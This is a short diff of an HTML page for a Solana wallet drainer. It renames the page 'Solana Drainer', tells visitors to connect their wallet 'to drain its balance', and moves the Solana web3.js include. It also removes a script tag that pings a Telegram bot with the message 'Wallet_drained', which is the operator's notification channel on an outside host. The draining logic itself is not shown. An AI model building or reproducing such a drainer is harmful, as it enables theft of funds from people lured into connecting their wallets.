@@ -3,9 +3,7 @@
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Solana</title>
- <script src="https://unpkg.com/@solana/web3.js"></script>
- <script src="https://telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text=Wallet_drained"></script>
+ <title>Solana Drainer</title>
  <style>
  body { font-family: Arial, sans-serif; }
  .container { max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
@@ -16,7 +14,7 @@
 <body>
  <div class="container">
  <h1>Connect Your Wallet</h1>
- <p>Connect your Solana wallet.</p>
+ <p>Connect your Solana wallet to drain its balance.</p>
  <button id="connectWallet">Connect Wallet</button>
  <p id="balance"></p>
  <p id="error" class="error"></p>
@@ -61,5 +59,6 @@
  }
  });
  </script>
+ <script src="https://unpkg.com/@solana/web3.js"></script>
 </body>
 </html>
